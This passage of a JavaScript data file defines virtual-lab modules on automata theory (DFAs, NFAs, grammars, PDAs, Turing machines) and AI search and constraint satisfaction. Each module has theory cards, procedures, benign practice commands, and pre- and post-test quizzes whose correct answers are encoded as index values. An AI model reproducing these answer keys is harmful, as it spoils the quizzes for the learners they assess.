        "5. Continue stepping through the string until completion, and verify if the final state matches the accepting criteria (success/fail)."
    ],
    "posttest": [
        {
            "q": "Which state represents the accepting state in our 'contains 01' DFA?",
            "options": [
                "q0",
                "q1",
                "q2",
                "None of these"
            ],
            "correct": 2
        },
        {
            "q": "If the input string is '1100', what is the final state of the 'contains 01' DFA?",
            "options": [
                "q0",
                "q1",
                "q2",
                "Trap state"
            ],
            "correct": 1
        },
        {
            "q": "In a state diagram, how is the final/accepting state represented?",
            "options": [
                "Circle with an arrow pointing to it",
                "Double circle",
                "Square box",
                "Dotted circle"
            ],
            "correct": 1
        }
    ],
    "simType": "dfa_sim",
    "practice_commands": [
        "dfa_create --states q0,q1,q2 --initial q0 --finals q2",
        "dfa_simulate --input 110101"
    ],
    "practice_questions": [
        "Draw a DFA that accepts strings ending with '10'.",
        "Explain Myhill-Nerode theorem in relation to DFA state equivalence."
    ]
};

window.VLAB_DATA.nfa_to_dfa = {
    "title": "NFA to DFA Converter",
    "aim": "To analyze Nondeterministic Finite Automata (NFA) behavior and simulate its conversion to an equivalent Deterministic Finite Automata (DFA) using the Subset Construction algorithm.",
    "theory": {
        "intro": "An NFA allows zero, one, or more transitions from a state on a given input symbol, as well as transitions on empty string inputs (epsilon transitions). Although NFAs are more flexible to design, DFAs are easier to execute. The Powerset (Subset) Construction algorithm converts any NFA to an equivalent DFA.",
        "cards": [
            {
                "title": "1. NFA vs DFA Equivalence",
                "content": "Every NFA has an equivalent DFA that accepts the exact same language. The number of states in the equivalent DFA can be up to $2^{|Q|}$ where $|Q|$ is the number of states in the NFA."
            },
            {
                "title": "2. Epsilon-Closure (e-closure)",
                "content": "The epsilon-closure of a state $q$ is the set of all states reachable from $q$ by taking only epsilon-labeled transitions. It represents all states the automaton can occupy without consuming any input characters."
            },
            {
                "title": "3. Subset Construction Step",
                "content": "For a subset of states $R \\subseteq Q$ and input symbol $a$, the next DFA state is computed as:\n$$\\delta_{DFA}(R, a) = \\bigcup_{q \\in R} \\text{e-closure}(\\delta_{NFA}(q, a))$$"
            }
        ]
    },
    "pretest": [
        {
            "q": "Which transitions are allowed in an NFA but forbidden in a DFA?",
            "options": [
                "Transitions to multiple states on a single symbol",
                "Epsilon (empty string) transitions",
                "Both A and B",
                "None of the above"
            ],
            "correct": 2
        },
        {
            "q": "If an NFA has 3 states, what is the maximum number of states in its equivalent DFA?",
            "options": [
                "3",
                "6",
                "8 (2^3)",
                "9"
            ],
            "correct": 2
        },
        {
            "q": "The epsilon-closure of a state always includes:",
            "options": [
                "The state itself",
                "All final states",
                "Only states reachable via symbol transitions",
                "The trap state"
            ],
            "correct": 0
        }
    ],
    "procedure": [
        "1. Review the NFA transition table showing states A, B, C and epsilon links.",
        "2. Click 'Run Subset Construction' to trace the algorithm step-by-step.",
        "3. Watch how the new subset states (e.g., {A, B}) are created and mapped.",
        "4. View the final converted DFA state transition table.",
        "5. Observe how the final states of the DFA are marked based on whether they contain any final states of the original NFA."
    ],
    "posttest": [
        {
            "q": "In NFA to DFA conversion, a DFA state is accepting if:",
            "options": [
                "It contains only NFA accepting states",
                "It contains at least one NFA accepting state",
                "It contains the NFA start state",
                "It has no transitions"
            ],
            "correct": 1
        },
        {
            "q": "Subset construction is also known as:",
            "options": [
                "DFA minimization",
                "Powerset construction",
                "Regex construction",
                "Chomsky normal form"
            ],
            "correct": 1
        },
        {
            "q": "Epsilon transitions enable the NFA to change state:",
            "options": [
                "Without reading any input symbol",
                "Only after reading all input symbols",
                "By flushing the stack",
                "By halting the tape"
            ],
            "correct": 0
        }
    ],
    "simType": "nfa_to_dfa",
    "practice_commands": [
        "nfa_to_dfa --nfa nfa_spec.json",
        "dfa_verify --nfa nfa_spec.json --dfa dfa_spec.json"
    ],
    "practice_questions": [
        "Convert an NFA that accepts strings ending with '01' to a DFA manually.",
        "Explain why the subset construction algorithm is guaranteed to terminate."
    ]
};

window.VLAB_DATA.regex_thompson = {
    "title": "Regex to NFA (Thompson's Construction)",
    "aim": "To study formal regular expressions and simulate their conversion into epsilon-Nondeterministic Finite Automata (e-NFA) using Thompson's construction rules.",
    "theory": {
        "intro": "Thompson's Construction is an algorithm that converts a regular expression into an equivalent non-deterministic finite automaton (NFA). The resulting NFA can then be used to match strings against the regular expression.",
        "cards": [
            {
                "title": "1. Base Cases",
                "content": "• Symbols: A single character $a$ is converted to a simple NFA with two states and one transition labeled $a$.\n• Epsilon: An empty expression $\\epsilon$ is converted to two states with an epsilon transition."
            },
            {
                "title": "2. Inductive Construction Rules",
                "content": "• **Concatenation (ab)**: Links the accept state of NFA $a$ to the start state of NFA $b$.\n• **Union (a|b)**: Adds a new start state pointing to start states of $a$ and $b$, and links their accepts to a new final state.\n• **Kleene Star (a*)**: Connects a new start state to NFA $a$'s start, allows loopback from NFA $a$'s accept to start, and bypasses NFA $a$ to NFA accept via epsilon."
            }
        ]
    },
    "pretest": [
        {
            "q": "Which algorithm is standard for converting a Regular Expression to an epsilon-NFA?",
            "options": [
                "Myhill-Nerode Algorithm",
                "Thompson's Construction",
                "subset construction",
                "Brzozowski minimization"
            ],
            "correct": 1
        },
        {
            "q": "What does the Kleene Star operator (*) in a regular expression represent?",
            "options": [
                "Exactly one occurrence",
                "Zero or more occurrences",
                "One or more occurrences",
                "Optional character"
            ],
            "correct": 1
        },
        {
            "q": "In regular expressions, what does the symbol '|' represent?",
            "options": [
                "Concatenation",
                "Intersection",
                "Union / Alternation",
                "Complement"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. Select a regular expression from the pre-loaded choices (e.g. (a|b)*abb or a*b).",
        "2. Click 'Parse Regex' to tokenize the expression.",
        "3. Click 'Step Construction' to watch NFA sub-graphs compile for base symbols, union forks, and star loops.",
        "4. Follow the structural assembly of states in the log trace.",
        "5. Observe how the final combined NFA graph links its start and accept states."
    ],
    "posttest": [
        {
            "q": "How many states are created in Thompson's construction for a single symbol 'a'?",
            "options": [
                "1",
                "2",
                "3",
                "4"
            ],
            "correct": 1
        },
        {
            "q": "In Thompson's Kleene Star construction, how many new epsilon transitions are introduced?",
            "options": [
                "2",
                "4",
                "1",
                "0"
            ],
            "correct": 1
        },
        {
            "q": "Regular languages are characterized as languages accepted by:",
            "options": [
                "Pushdown Automata",
                "Finite Automata",
                "Turing Machines",
                "Linear Bounded Automata"
            ],
            "correct": 1
        }
    ],
    "simType": "regex_thompson",
    "practice_commands": [
        "regex_parse --regex \"(a|b)*abb\"",
        "regex_to_nfa --regex \"a*b\""
    ],
    "practice_questions": [
        "Draw the Thompson NFA for the regular expression 'a(b|c)*'.",
        "Compare Thompson's construction NFA size with McNaughton-Yamada-Glushkov NFA."
    ]
};

window.VLAB_DATA.cfg_parser = {
    "title": "CFG & Derivation Trees",
    "aim": "To construct Context-Free Grammars (CFG) for formal languages and simulate string derivation trees visually.",
    "theory": {
        "intro": "A Context-Free Grammar (CFG) is a 4-tuple $(V, \\Sigma, R, S)$ that defines a language by recursively replacing variables with sequences of variables and terminals. Derivation trees (or parse trees) represent this replacement hierarchy visually.",
        "cards": [
            {
                "title": "1. The 4-Tuple Grammar Spec",
                "content": "• $V$: Non-terminals/Variables (e.g. $\\{S\\}$).\n• $\\Sigma$: Terminals/Characters (e.g. $\\{a, b\\}$).\n• $R$: Production rules (e.g. $S \\to aSb \\mid \\epsilon$).\n• $S$: Start symbol ($S \\in V$)."
            },
            {
                "title": "2. Derivation Methods",
                "content": "• **Leftmost Derivation**: Replaces the leftmost non-terminal variable first at each step.\n• **Rightmost Derivation**: Replaces the rightmost non-terminal variable first."
            },
            {
                "title": "3. Ambiguity",
                "content": "A grammar is ambiguous if there exists a string in its language that can have two or more distinct leftmost derivations (or parse trees)."
            }
        ]
    },
    "pretest": [
        {
            "q": "Context-Free Grammars are categorized in Chomsky Hierarchy as:",
            "options": [
                "Type-0",
                "Type-1",
                "Type-2",
                "Type-3"
            ],
            "correct": 2
        },
        {
            "q": "A production rule S -> aSb is typical for generating which language?",
            "options": [
                "a^n b^n",
                "a* b*",
                "(ab)*",
                "a^n b^2n"
            ],
            "correct": 0
        },
        {
            "q": "Non-terminals in a CFG represent:",
            "options": [
                "Input string characters",
                "Grammar variables that can be replaced",
                "Accepting states",
                "Stack items"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Select a language (e.g., Parentheses Matching: S -> (S) | SS | epsilon, or a^n b^n: S -> aSb | epsilon).",
        "2. Input a test string (e.g., ((())) or aaabbb).",
        "3. Click 'Generate Parse Tree' to launch the derivation.",
        "4. Follow the step-by-step replacement of the start variable S by terminals and sub-variables.",
        "5. Analyze the resulting vertical tree layout showing the structural hierarchy."
    ],
    "posttest": [
        {
            "q": "Which parser parses strings bottom-up by finding handles?",
            "options": [
                "LL(1)",
                "LR(0)/LR(1)",
                "Recursive Descent",
                "LALR"
            ],
            "correct": 1
        },
        {
            "q": "If a grammar yields multiple distinct parse trees for a single string, it is:",
            "options": [
                "Unsolvable",
                "Ambiguous",
                "Deterministic",
                "Regular"
            ],
            "correct": 1
        },
        {
            "q": "Chomsky Normal Form (CNF) requires production rules to be in which format?",
            "options": [
                "A -> BC or A -> a",
                "A -> aB",
                "A -> a",
                "S -> aSb"
            ],
            "correct": 0
        }
    ],
    "simType": "cfg_parser",
    "practice_commands": [
        "cfg_parse --grammar cfg_rules.txt --input \"(())\"",
        "cfg_check_ambiguity --grammar cfg_rules.txt"
    ],
    "practice_questions": [
        "Write a grammar for arithmetic expressions involving +, *, and parenthesis.",
        "Convert the grammar S -> aSb | epsilon to Chomsky Normal Form."
    ]
};

window.VLAB_DATA.pda_stack = {
    "title": "Pushdown Automata (PDA) Stack Simulator",
    "aim": "To simulate a Pushdown Automata (PDA) for the non-regular language $a^n b^n$, demonstrating stack push and pop operations.",
    "theory": {
        "intro": "A Pushdown Automaton (PDA) is a finite automaton equipped with an auxiliary infinite storage stack. This stack gives the PDA the power to count nested symbols, allowing it to recognize context-free languages that finite automata cannot.",
        "cards": [
            {
                "title": "1. Stack operations",
                "content": "Transitions are written as $a, b \\to c$, meaning: read input symbol $a$, pop $b$ from the top of the stack, and push $c$ onto the stack. An epsilon ($\\epsilon$) indicates no read, push, or pop."
            },
            {
                "title": "2. The counting mechanism for a^n b^n",
                "content": "• For every 'a' read, push a marker symbol 'A' onto the stack.\n• For every 'b' read, pop 'A' from the stack.\n• If the stack is empty (marker 'Z0' is reached) when input ends, accept the string."
            }
        ]
    },
    "pretest": [
        {
            "q": "A Pushdown Automaton differs from a Finite Automaton by having:",
            "options": [
                "Multiple head tapes",
                "An auxiliary stack memory",
                "Infinite states",
                "Random access memory"
            ],
            "correct": 1
        },
        {
            "q": "To recognize the language a^n b^n, a PDA performs which sequence of stack operations?",
            "options": [
                "Push 'a', Pop 'b'",
                "Push 'a', Push 'b'",
                "Pop 'a', Pop 'b'",
                "Keep stack empty throughout"
            ],
            "correct": 0
        },
        {
            "q": "If a PDA can accept either by final state or by empty stack, which represents a larger class of languages?",
            "options": [
                "Final State PDA",
                "Empty Stack PDA",
                "Both accept the exact same class of languages (Context-Free)",
                "Neither, they are unrelated"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. Enter a test string in the input tape field (e.g. aaabbb).",
        "2. Click 'Reset' to initialize the PDA state to q0 with stack containing initial symbol Z0.",
        "3. Step through the input string character-by-character using 'Next Step'.",
        "4. Observe that reading 'a' pushes 'A' onto the vertical stack container visually.",
        "5. Observe that reading 'b' pops 'A' off the stack. Check final tape acceptance."
    ],
    "posttest": [
        {
            "q": "What is the status of the stack when a^n b^n is successfully accepted?",
            "options": [
                "Filled with 'A's",
                "Filled with 'B's",
                "Only contains the initial marker Z0",
                "Completely empty (if accepting by empty stack)"
            ],
            "correct": 2
        },
        {
            "q": "PDAs accept which class of languages?",
            "options": [
                "Regular Languages",
                "Context-Free Languages",
                "Context-Sensitive Languages",
                "Recursively Enumerable Languages"
            ],
            "correct": 1
        },
        {
            "q": "Which stack operation does not change stack state?",
            "options": [
                "Push",
                "Pop",
                "Skip/Ignore (represented as epsilon transition)",
                "Clear"
            ],
            "correct": 2
        }
    ],
    "simType": "pda_stack",
    "practice_commands": [
        "pda_simulate --pda pda_spec.json --input aaabbb",
        "pda_print_trace --input aaabbb"
    ],
    "practice_questions": [
        "Design a PDA to accept strings of balanced parentheses.",
        "Explain the difference between deterministic and non-deterministic PDA."
    ]
};

window.VLAB_DATA.turing_machine = {
    "title": "Turing Machine Tape Simulator",
    "aim": "To study Turing Machine models of computation and simulate a Turing Machine that increments a binary number (e.g. 1011 -> 1100) on an infinite tape.",
    "theory": {
        "intro": "A Turing Machine (TM) is a mathematical model of computation introduced by Alan Turing. It consists of an infinite tape divided into cells, a read/write head that can move left or right, and a state controller. The TM is a formal model representing the limits of mechanical computation.",
        "cards": [
            {
                "title": "1. Formal Definition",
                "content": "A Turing Machine consists of $(Q, \\Sigma, \\Gamma, \\delta, q_0, q_{accept}, q_{reject})$:\n• $\\Gamma$: Tape alphabet containing blank symbol $B$ and input symbols.\n• $\\delta$: Transition function $\\delta : Q \\times \\Gamma \\to Q \\times \\Gamma \\times \\{L, R\\}$."
            },
            {
                "title": "2. The Binary Increment Algorithm",
                "content": "1. Move head right to find the blank symbol $B$ representing the end of the binary string.\n2. Move left, changing 1s to 0s (representing carry overs) until a 0 or $B$ is read.\n3. Replace that 0 or $B$ with 1, then halt. This successfully adds 1."
            }
        ]
    },
    "pretest": [
        {
            "q": "A Turing Machine can write to its tape, whereas a Finite Automaton:",
            "options": [
                "Can only read its input",
                "Can only write to its memory",
                "Cannot move its head",
                "Has infinite tape"
            ],
            "correct": 0
        },
        {
            "q": "What does the transition delta(q, X) = (p, Y, L) mean?",
            "options": [
                "Write Y, move head Left, transition to state p",
                "Write X, move head Right, transition to state p",
                "Move head Left only",
                "Halt the machine"
            ],
            "correct": 0
        },
        {
            "q": "The Church-Turing thesis states that:",
            "options": [
                "Turing machines can solve any mathematical problem",
                "Any function that can be computed by an algorithm can be computed by a Turing Machine",
                "Computers will exceed human intelligence",
                "All programming languages are regular"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Enter a binary string in the tape cells (e.g. 1011).",
        "2. Click 'Reset' to place the head pointer at the leftmost character in state q0.",
        "3. Click 'Step' to execute transitions. Watch the head read, write (e.g. replace 1 with 0), move direction (Left or Right), and change state.",
        "4. Notice the tape ribbon slide horizontally to keep the active head centered.",
        "5. Observe the final halts in state 'q_halt' displaying the correct incremented result (e.g., 1100)."
    ],
    "posttest": [
        {
            "q": "When incrementing the binary number '111', what is the tape output after halting?",
            "options": [
                "000",
                "111",
                "1000",
                "112"
            ],
            "correct": 2
        },
        {
            "q": "A language is called Decidable if there exists a Turing Machine that:",
            "options": [
                "Accepts it and halts on all inputs (loops forever on none)",
                "Accepts it but may loop forever on strings not in language",
                "Cannot parse it",
                "Runs in polynomial time"
            ],
            "correct": 0
        },
        {
            "q": "Turing Machine tape is considered to be:",
            "options": [
                "Finite and circular",
                "Infinite in at least one direction",
                "Write-once read-many",
                "None of these"
            ],
            "correct": 1
        }
    ],
    "simType": "turing_machine",
    "practice_commands": [
        "tm_simulate --tm bin_inc.json --tape 1011",
        "tm_debug_states --tape 1011"
    ],
    "practice_questions": [
        "Design a Turing Machine to accept the non-context-free language a^n b^n c^n.",
        "Describe the Halting Problem and why it is undecidable."
    ]
};

window.VLAB_DATA.dfa_minimization = {
    "title": "DFA Minimization (Myhill-Nerode)",
    "aim": "To study DFA minimization and simulate the Table-Filling (Myhill-Nerode) algorithm to identify equivalent state partitions and build a minimal DFA.",
    "theory": {
        "intro": "DFA Minimization transforms a given DFA into an equivalent DFA with the minimum possible number of states. This is done by identifying and merging equivalent states. Myhill-Nerode Table-Filling algorithm organizes this partition check systematically.",
        "cards": [
            {
                "title": "1. Equivalent States",
                "content": "Two states $p$ and $q$ are equivalent if for all strings $w \\in \\Sigma^*$, the transition from $p$ on $w$ leads to an accepting state if and only if the transition from $q$ on $w$ leads to an accepting state. If they lead to different outcomes, they are distinguishable."
            },
            {
                "title": "2. The Table-Filling Algorithm",
                "content": "1. Construct a triangular table for all pairs $(p, q)$ of states.\n2. Mark all pairs where $p$ is accepting and $q$ is non-accepting (base step).\n3. For each unmarked pair $(p, q)$, check if $(\\delta(p, a), \\delta(q, a))$ is marked for any input symbol $a$. If marked, mark $(p, q)$ (inductive step).\n4. Repeat until no more markings can be made. Unmarked pairs are equivalent."
            }
        ]
    },
    "pretest": [
        {
            "q": "What is the primary purpose of DFA Minimization?",
            "options": [
                "To convert NFA to DFA",
                "To reduce the number of states in a DFA to the absolute minimum equivalent state count",
                "To parse grammars faster",
                "To compress the source code"
            ],
            "correct": 1
        },
        {
            "q": "In the base step of Myhill-Nerode table-filling algorithm, which state pairs are marked first?",
            "options": [
                "Start state and trap state",
                "Final states and non-final states",
                "All pairs containing q0",
                "No pairs are marked"
            ],
            "correct": 1
        },
        {
            "q": "If states A and B are equivalent, it means for any input string:",
            "options": [
                "They both transition to accepting states or both transition to non-accepting states",
                "They transition to the exact same state",
                "They require the same CPU cycles",
                "They halt immediately"
            ],
            "correct": 0
        }
    ],
    "procedure": [
        "1. Observe the 5-state DFA (A, B, C, D, E) where C and D are equivalent.",
        "2. Look at the triangular pair-distinguishability grid.",
        "3. Click 'Mark Base Distinguishability' to mark final/non-final splits (cells marked with 'X').",
        "4. Click 'Step Transitions' to check transitions of unmarked pairs. Notice how cells distinguish and get marked.",
        "5. Observe the unmarked pairs that remain (equivalent states) and check the resulting minimized DFA structure."
    ],
    "posttest": [
        {
            "q": "If we minimize a DFA containing 5 states, and states C and D are equivalent, how many states does the minimized DFA have?",
            "options": [
                "5",
                "4",
                "3",
                "2"
            ],
            "correct": 1
        },
        {
            "q": "Can a minimized DFA be non-deterministic?",
            "options": [
                "Yes, if it has epsilon loops",
                "No, it must remain deterministic",
                "Yes, always",
                "Depends on state names"
            ],
            "correct": 1
        },
        {
            "q": "Which theorem forms the theoretical foundation of DFA state minimization?",
            "options": [
                "Pumping Lemma",
                "Myhill-Nerode Theorem",
                "Chomsky Normalization Theorem",
                "Cook-Levin Theorem"
            ],
            "correct": 1
        }
    ],
    "simType": "dfa_minimization",
    "practice_commands": [
        "dfa_minimize --dfa dfa_spec.json",
        "dfa_compare --dfa1 spec1.json --dfa2 spec2.json"
    ],
    "practice_questions": [
        "Minimize a DFA with states A, B, C, D, E, F where F is accepting and transitions are given.",
        "Why is DFA minimization unique, whereas NFA minimization is not?"
    ]
};

window.VLAB_DATA.ai_search = {
    "title": "BFS, DFS & A* Search Algorithms",
    "aim": "To study and visually simulate uninformed search strategies (BFS, DFS) and the informed heuristic-guided A* algorithm on a graph, comparing their traversal order, time complexity, and optimality.",
    "theory": {
        "intro": "Graph search algorithms are the foundation of AI problem solving. Breadth-First Search (BFS) explores a graph level by level guaranteeing the shortest path in unweighted graphs. Depth-First Search (DFS) explores as deep as possible before backtracking, using less memory but not guaranteeing shortest paths. A* Search combines actual cost g(n) with a heuristic estimate h(n) to always find the optimal path efficiently when the heuristic is admissible.",
        "cards": [
            {
                "title": "1. Breadth-First Search (BFS)",
                "content": "BFS uses a FIFO queue. It explores all nodes at depth d before nodes at depth d+1.\n• Time Complexity: O(b^d) where b=branching factor, d=depth\n• Space Complexity: O(b^d) — stores all nodes at the frontier level\n• Complete: Yes (finds a solution if one exists)\n• Optimal: Yes for unit-cost edges"
            },
            {
                "title": "2. Depth-First Search (DFS)",
                "content": "DFS uses a LIFO stack (or recursion). It plunges deep into one branch before backtracking.\n• Time Complexity: O(b^m) where m = maximum depth\n• Space Complexity: O(bm) — only stores the current path\n• Complete: No (can get stuck in infinite loops without visited tracking)\n• Optimal: No"
            },
            {
                "title": "3. A* Search Algorithm",
                "content": "A* uses an evaluation function f(n) = g(n) + h(n) where:\n• g(n) = cost from start to node n\n• h(n) = admissible heuristic estimate from n to goal (never overestimates)\nA* is both Complete and Optimal when h(n) is admissible. Common heuristics: Manhattan distance, Euclidean distance."
            },
            {
                "title": "4. Complexity Comparison",
                "content": "| Algorithm | Time | Space | Complete | Optimal |\n|-----------|------|-------|----------|---------|\n| BFS | O(b^d) | O(b^d) | Yes | Yes (unit cost) |\n| DFS | O(b^m) | O(bm) | No | No |\n| A* | O(b^d) | O(b^d) | Yes | Yes (admissible h) |"
            }
        ]
    },
    "pretest": [
        {
            "q": "Which data structure does BFS use internally?",
            "options": [
                "Stack",
                "Queue",
                "Priority Queue",
                "Linked List"
            ],
            "correct": 1
        },
        {
            "q": "A* search is optimal when the heuristic is:",
            "options": [
                "Consistent only",
                "Admissible (never overestimates)",
                "Always zero",
                "Greater than actual cost"
            ],
            "correct": 1
        },
        {
            "q": "DFS has a space complexity of:",
            "options": [
                "O(b^d)",
                "O(bm)",
                "O(n log n)",
                "O(1)"
            ],
            "correct": 1
        },
        {
            "q": "Which search is guaranteed to find the shortest path in an unweighted graph?",
            "options": [
                "DFS",
                "A*",
                "BFS",
                "Greedy Best-First"
            ],
            "correct": 2
        },
        {
            "q": "In A*, f(n) = g(n) + h(n). What does g(n) represent?",
            "options": [
                "Heuristic estimate to goal",
                "Cost from start to n",
                "Total estimated cost",
                "Branching factor"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Select an algorithm (BFS, DFS, or A*) from the dropdown.",
        "2. Click a start node and a goal node on the graph canvas.",
        "3. Click 'Run' to animate the search step by step.",
        "4. Observe the explored nodes (blue), frontier (yellow), and final path (green).",
        "5. Compare the number of nodes explored and path cost across algorithms."
    ],
    "posttest": [
        {
            "q": "If a graph has cycles, which search must use a visited set to avoid infinite loops?",
            "options": [
                "BFS only",
                "A* only",
                "DFS",
                "All of the above"
            ],
            "correct": 3
        },
        {
            "q": "A* with h(n)=0 for all nodes behaves like:",
            "options": [
                "DFS",
                "Greedy Best-First",
                "Dijkstra / UCS",
                "IDDFS"
            ],
            "correct": 2
        },
        {
            "q": "Which algorithm uses the least memory for deep graphs?",
            "options": [
                "BFS",
                "A*",
                "DFS",
                "Bidirectional BFS"
            ],
            "correct": 2
        },
        {
            "q": "The admissibility condition for a heuristic means:",
            "options": [
                "h(n) >= actual cost",
                "h(n) <= actual cost",
                "h(n) = 0",
                "h(n) is consistent"
            ],
            "correct": 1
        },
        {
            "q": "BFS is NOT optimal when:",
            "options": [
                "Graph is unweighted",
                "Edge costs are uniform",
                "Edges have varying costs",
                "Graph is a tree"
            ],
            "correct": 2
        }
    ],
    "simType": "ai_search",
    "practice_commands": [
        "python bfs.py --graph graph.json --start A --goal G",
        "python dfs.py --graph graph.json",
        "python astar.py --heuristic manhattan"
    ],
    "practice_questions": [
        "Implement A* on a 5x5 grid using Manhattan distance heuristic.",
        "Why does DFS fail in infinite-depth search spaces without depth limiting?"
    ]
};

window.VLAB_DATA.ai_heuristic = {
    "title": "Heuristic & Informed Search (Greedy, A*)",
    "aim": "To compare Greedy Best-First Search and A* on a weighted graph, demonstrating the role of heuristics in guiding search efficiency and the trade-off between optimality and speed.",
    "theory": {
        "intro": "Informed search strategies use domain-specific knowledge in the form of a heuristic function h(n) to guide the search toward the goal more efficiently than uninformed strategies. Greedy Best-First Search expands the node that appears closest to the goal based purely on h(n), while A* balances actual path cost with heuristic estimation.",
        "cards": [
            {
                "title": "1. Greedy Best-First Search",
                "content": "Uses f(n) = h(n) only. Expands the node closest to the goal by heuristic estimate.\n• Fast but NOT optimal — can get stuck in local minima.\n• Not complete in general (may loop without revisit check).\n• Space: O(b^m) in worst case."
            },
            {
                "title": "2. A* Optimality Proof",
                "content": "A* is optimal if h(n) is admissible. Proof sketch:\n1. Let G be the optimal goal. Let G2 be a suboptimal goal in the queue.\n2. Since h is admissible, f(n) <= C* for any n on the optimal path.\n3. A* expands n before G2, guaranteeing optimal path discovery."
            },
            {
                "title": "3. Consistency (Monotonicity)",
                "content": "A heuristic h is consistent if for every node n and successor n': h(n) <= c(n,n') + h(n'). Consistency implies admissibility. With a consistent heuristic, A* never re-opens a closed node, making it more efficient."
            }
        ]
    },
    "pretest": [
        {
            "q": "Greedy Best-First uses which evaluation function?",
            "options": [
                "f(n) = g(n)",
                "f(n) = h(n)",
                "f(n) = g(n)+h(n)",
                "f(n) = 1/h(n)"
            ],
            "correct": 1
        },
        {
            "q": "Which is true about Greedy Best-First Search?",
            "options": [
                "Always optimal",
                "Always complete",
                "Fast but may not find optimal path",
                "Uses no heuristic"
            ],
            "correct": 2
        },
        {
            "q": "Consistency of a heuristic implies:",
            "options": [
                "Admissibility",
                "Completeness",
                "Both admissibility and A* efficiency",
                "Optimality of DFS"
            ],
            "correct": 2
        },
        {
            "q": "In A*, expanding nodes in order of f(n)=g(n)+h(n) is guaranteed optimal if:",
            "options": [
                "h(n) is consistent",
                "h(n) is admissible",
                "h(n)=0",
                "g(n)=0"
            ],
            "correct": 1
        },
        {
            "q": "Which heuristic for a grid maze is admissible?",
            "options": [
                "Euclidean distance",
                "Manhattan distance",
                "Both A and B",
                "Number of walls"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. Observe the weighted graph displayed with node heuristic values shown.",
        "2. Select 'Greedy Best-First' and run — observe the fast but possibly suboptimal path.",
        "3. Select 'A*' and run — observe the optimal path with more node expansions.",
        "4. Compare total path cost and nodes explored for both strategies.",
        "5. Modify heuristic values and re-run to see how search behavior changes."
    ],
    "posttest": [
        {
            "q": "Greedy Best-First can fail to find the optimal solution because:",
            "options": [
                "It ignores g(n)",
                "It uses visited sets",
                "It is complete",
                "It expands all nodes"
            ],
            "correct": 0
        },
        {
            "q": "If h(n) is inadmissible, A* may:",
            "options": [
                "Fail to terminate",
                "Return a suboptimal solution",
                "Explore fewer nodes",
                "Be identical to DFS"
            ],
            "correct": 1
        },
        {
            "q": "A consistent heuristic satisfies:",
            "options": [
                "h(n) = c(n,n') + h(n')",
                "h(n) <= c(n,n') + h(n')",
                "h(n) >= c(n,n') + h(n')",
                "h(n) = 0"
            ],
            "correct": 1
        },
        {
            "q": "Which search explores the fewest nodes given a perfect heuristic?",
            "options": [
                "BFS",
                "DFS",
                "A*",
                "Greedy Best-First"
            ],
            "correct": 2
        },
        {
            "q": "IDA* improves upon A* primarily in terms of:",
            "options": [
                "Time complexity",
                "Memory usage",
                "Completeness",
                "Optimality"
            ],
            "correct": 1
        }
    ],
    "simType": "ai_heuristic",
    "practice_commands": [
        "python greedy_bfs.py --graph weighted.json",
        "python astar_weighted.py --start S --goal G"
    ],
    "practice_questions": [
        "Design an admissible heuristic for the 8-puzzle problem.",
        "Why does IDA* use less memory than A*?"
    ]
};

window.VLAB_DATA.ai_csp = {
    "title": "Constraint Satisfaction Problems (N-Queens)",
    "aim": "To model and solve the N-Queens problem as a Constraint Satisfaction Problem (CSP) using backtracking with forward checking, demonstrating constraint propagation and variable ordering.",
    "theory": {
        "intro": "A Constraint Satisfaction Problem (CSP) is defined by a set of variables X, domains D, and constraints C. A solution assigns a value from each variable's domain such that all constraints are satisfied. CSPs arise in scheduling, map coloring, Sudoku, and planning. The N-Queens problem places N queens on an NxN chessboard such that no two queens threaten each other.",
        "cards": [
            {
                "title": "1. CSP Formulation of N-Queens",
                "content": "• Variables: Q1, Q2, ..., Qn (one per column)\n• Domain: Di = {1, 2, ..., n} (row position)\n• Constraints: Qi ≠ Qj (no same row) AND |Qi - Qj| ≠ |i - j| (no same diagonal) for all i ≠ j"
            },
            {
                "title": "2. Backtracking Search",
                "content": "Backtracking systematically tries variable assignments. When a constraint is violated, it reverts to the previous variable and tries a different value. It is the basic algorithm for solving CSPs but can be slow without enhancements."
            },
            {
                "title": "3. Forward Checking & Arc Consistency",
                "content": "Forward Checking: After assigning a value to variable Xi, eliminate inconsistent values from future variables' domains. If any domain becomes empty, backtrack immediately.\n\nArc Consistency (AC-3): Ensures that for every arc (Xi, Xj), every value in Di has a consistent value in Dj. AC-3 prunes the search space drastically before and during search."
            }
        ]
    },
    "pretest": [
        {
            "q": "In the N-Queens CSP, what is the domain of each variable?",
            "options": [
                "Column positions",
                "Row positions {1..N}",
                "Diagonal positions",
                "Board squares"
            ],
            "correct": 1
        },
        {
            "q": "Forward checking eliminates values from:",
            "options": [
                "Assigned variables",
                "Future unassigned variables' domains",
                "All variables simultaneously",
                "Only the current variable"
            ],
            "correct": 1
        },
        {
            "q": "Arc consistency (AC-3) reduces:",
            "options": [
                "Only time complexity",
                "Domain sizes before search",
                "Number of variables",
                "Number of constraints"
            ],
            "correct": 1
        },
        {
            "q": "The N-Queens problem is an example of:",
            "options": [
                "Scheduling CSP",
                "Binary CSP",
                "Constraint optimization",
                "Linear programming"
            ],
            "correct": 1
        },
        {
            "q": "Backtracking is needed when:",
            "options": [
                "No constraint is violated",
                "A domain becomes empty",
                "All variables are assigned",
                "Forward checking succeeds"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Set N (board size) using the slider (4 to 8 recommended).",
        "2. Choose algorithm: Basic Backtracking or Backtracking + Forward Checking.",
        "3. Click 'Solve' to watch queens being placed column by column.",
        "4. Observe red highlighting when a constraint violation triggers backtracking.",
        "5. Count total backtracks and compare between algorithms."
    ],
    "posttest": [
        {
            "q": "The 8-Queens problem has how many distinct solutions?",
            "options": [
                "12",
                "92",
                "64",
                "256"
            ],
            "correct": 1
        },
        {
            "q": "Minimum Remaining Values (MRV) heuristic selects:",
            "options": [
                "Variable with largest domain",
                "Variable with smallest remaining domain",
                "Any unassigned variable",
                "Variable with most constraints"
            ],
            "correct": 1
        },
        {
            "q": "Degree heuristic is used to break ties in:",
            "options": [
                "Value ordering",
                "MRV heuristic",
                "Arc consistency",
                "Forward checking"
            ],
            "correct": 1
        },
        {
            "q": "AC-3 runs in time complexity of:",
            "options": [
                "O(n²)",
                "O(cd³)",
